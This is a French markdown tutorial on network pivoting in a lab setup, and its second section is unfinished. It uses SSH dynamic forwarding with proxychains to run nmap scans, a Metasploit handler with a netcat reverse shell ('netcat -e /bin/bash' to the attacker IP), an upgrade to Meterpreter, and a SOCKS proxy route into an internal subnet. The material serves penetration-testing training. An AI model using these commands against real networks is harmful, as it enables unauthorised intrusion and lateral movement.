# Comment faire un pivot
## Introduction
Le but est de faire communiquer la machine kali avec la machine sur l'autre réseau par le biais du pivot.
Pour bien comprendre le pivot dans un réseau, on va y aller avec 3 machines en 2 parties, d'une part le pivot linux, puis le pivot Windows :
### Première partie
![Pic1](img/Pivot_1.PNG?raw=true)</br>
### Deuxième partie
![Pic2](img/Pivot_2.PNG?raw=true)</br>

## Première partie

### Pivot Proxychains & SSH
Sur l'attaquant :
```bash
# Redirection ssh, tout le traffic qui va sur 9050 est redirigé en ssh vers 10.0.0.10
# -f pour exécuter en tant que service
# -N pour ne pas exécuter de commande
# -D pour indiquer un port forwarding dynamique
$ ssh -f -N -D 9050 msfadmin@10.0.0.10

# Proxychain redirige tout le flux de la commande vers 9050 (son port par défaut dans /etc/proxychains.conf)
$ proxychains nmap 192.168.0.110 -p 135,139,445
```
![Pic3](img/Pivot_3.PNG?raw=true)</br>

### Pivot Meterpreter & Socks
Il faut avoir un shell déjà sur la machine, je vais en faire un avec netcat :
```bash
$ msfconsole
msf > use exploits/multi/handler
msf > set lhost 10.0.0.1
msf > run
```
```bash
$ sudo netcat -e /bin/bash 10.0.0.1 4444 
```
```bash
msf > background
msf > sessions
```
![Pic4](img/Pivot_4.PNG?raw=true)</br>
On transforme le shell en shell meterpreter :
```bash
msf > sessions -u 1
```
![Pic5](img/Pivot_5.PNG?raw=true)</br>
Nous allons maintenant mettre en place le proxy sock de meterpreter en arrière plan :
```bash
msf > route add 192.168.0.0/24 2
msf > use auxiliary/server/socks_proxy
msf > set srvport 9050
msf > set version 4a
msf > run -j
```
Dans une nouvelle fenetre, on peut alors taper du nmap :
```bash
$ proxychains nmap -p 135,139,445 192.168.0.110
```
![Pic6](img/Pivot_6.PNG?raw=true)</br>

## Deuxième partie
On commence par compromettre le Windows 7 pour avoir un accès administrateur :
```bash
$ bla bla
```
![Pic4](img/Pivot_X.PNG?raw=true)</br>